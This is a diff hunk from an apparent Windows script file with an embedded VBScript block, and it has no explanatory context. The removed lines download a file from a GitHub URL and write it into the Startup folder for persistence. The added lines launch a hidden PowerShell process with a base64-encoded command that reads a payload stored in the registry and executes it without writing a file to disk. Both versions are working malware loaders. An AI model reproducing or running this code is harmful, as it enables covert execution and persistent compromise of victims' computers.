@@ -18,16 +18,9 @@
 <script language="VBScript">
 <![CDATA[
 
-dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
-dim bStrm: Set bStrm = createobject("Adodb.Stream")
-xHttp.Open "GET", "https://raw.githubusercontent.com/edu999/k99/master/fg.txt", False
-xHttp.Send
-with bStrm
-    .type = 0 '//binary
-    .open
-    .write xHttp.responseBody
-    .savetofile "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup", 2 '//overwrite
-end with
+sCmd = "powershell -w hidden -NoP -enc aQBlAHgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABHAGUAdAAtAEkAdABlAG0AIAAnAEgASwBMAE0AOgBTAG8AZgB0AHcAYQByAGUAJwApAC4ARwBlAHQAVgBhAGwAdQBlACgAJwBIAGUAbABwAGUAcgAnACkAKQApACkA"
+Set oShell = CreateObject("Wscript.Shell")
+iResult = oShell.Run(sCmd, 0, true)
 
 ]]>
 </script>
